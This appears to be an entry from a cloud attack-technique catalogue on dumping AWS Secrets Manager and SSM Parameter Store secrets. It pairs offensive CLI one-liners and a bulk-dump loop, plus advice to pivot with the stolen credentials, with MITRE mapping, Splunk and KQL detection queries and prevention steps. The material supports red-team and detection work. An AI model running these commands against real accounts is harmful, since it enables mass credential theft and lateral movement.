name: AWS Secrets Manager + SSM Parameter Store Dump
description: Enumerate and exfiltrate stored secrets across AWS Secrets Manager and SSM Parameter Store. With secretsmanager:ListSecrets/GetSecretValue and ssm:DescribeParameters/GetParameter(s), an attacker harvests database passwords, API keys, OAuth tokens, and other credentials in bulk - a classic post-compromise step that converts limited cloud access into access to downstream systems.
notes:
=== PERMISSIONS ===
  Secrets Manager: secretsmanager:ListSecrets, secretsmanager:GetSecretValue
  Parameter Store: ssm:DescribeParameters, ssm:GetParameter(s),
                   ssm:GetParametersByPath (+ kms:Decrypt for SecureString)

=== SECRETS MANAGER - LIST + DUMP ALL ===
  aws secretsmanager list-secrets --query 'SecretList[].Name'
  aws secretsmanager get-secret-value --secret-id <target> \
    --query SecretString --output text
  # dump everything:
  for s in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text); do
    echo "== $s =="; aws secretsmanager get-secret-value --secret-id "$s" --query SecretString --output text;
  done

=== SSM PARAMETER STORE - LIST + DUMP ===
  aws ssm describe-parameters --query 'Parameters[].Name'
  aws ssm get-parameter --name <target> --with-decryption --query Parameter.Value --output text
  # recursive dump of a path (decrypts SecureString):
  aws ssm get-parameters-by-path --path / --recursive --with-decryption

=== CROSS-REGION ===
  Secrets are region-scoped; repeat with --region in each enabled region.

=== NEXT ===
  Use harvested DB/API creds to pivot into application backends.

examples.label: Dump all Parameter Store values decrypted

references.title: hackingthe.cloud - Enumerate and read Secrets Manager

recommended.note: Lambda env vars are another secret store to loot.

defense.why_it_works: Secrets Manager and Parameter Store are the sanctioned secret stores, and reading them is a normal API call. An identity granted (often over-broadly) GetSecretValue or GetParameter with kms:Decrypt can read every secret it is allowed to touch, in bulk, with no exploit needed.
defense.prerequisites: IAM permissions secretsmanager:GetSecretValue or ssm:GetParameter(s) (ListSecrets/DescribeParameters to enumerate), plus kms:Decrypt on the encrypting key for SecureString/encrypted secrets.
defense.impact: Mass theft of stored credentials - database passwords, API keys, tokens - enabling lateral movement into databases, SaaS, and other systems well beyond AWS.
defense.detection: [MITRE T1552.005] CloudTrail GetSecretValue / GetParameter(s) / GetParametersByPath at high volume or from unusual principals; BatchGetSecretValue; many distinct secret IDs read by one identity in a short window.
defense.artifacts: CloudTrail events GetSecretValue, GetParameters, GetParametersByPath with requestParameters.secretId/names and withDecryption=true; associated kms:Decrypt events on the secret's key.
defense.splunk_spl:
index=aws sourcetype=aws:cloudtrail (eventName=GetSecretValue OR eventName=GetParameter OR eventName=GetParameters OR eventName=GetParametersByPath)
| stats dc(requestParameters.secretId) as nsecrets count by userIdentity.arn, sourceIPAddress
| where count>10
defense.elastic_kql: aws.cloudtrail.event_name:(GetSecretValue or GetParameter or GetParameters or GetParametersByPath)
defense.sentinel_kql:
AWSCloudTrail
| where EventName in ("GetSecretValue","GetParameter","GetParameters","GetParametersByPath")
| summarize Reads=count(), Secrets=dcount(tostring(parse_json(RequestParameters).secretId)) by UserIdentityArn, SourceIpAddress
| where Reads > 10
defense.prevention: Scope GetSecretValue/GetParameter to specific secret ARNs per workload; separate KMS keys per sensitivity and restrict kms:Decrypt; enable rotation; alert on bulk or anomalous secret reads; deny human/interactive principals direct GetSecretValue in production; use resource policies on secrets.

detections.name: Bulk secret/parameter retrieval by a single principal
detections.logic:
index=aws sourcetype=aws:cloudtrail eventName IN (GetSecretValue, GetParameter, GetParameters, GetParametersByPath)
| bucket _time span=10m
| stats dc(requestParameters.secretId) as secrets count by _time, userIdentity.arn, sourceIPAddress
| where count>10
detections.false_positives: Application roles that legitimately read many secrets at startup
detections.tuning: Baseline per-role normal read volume and secret set; alert on new principals or spikes above baseline
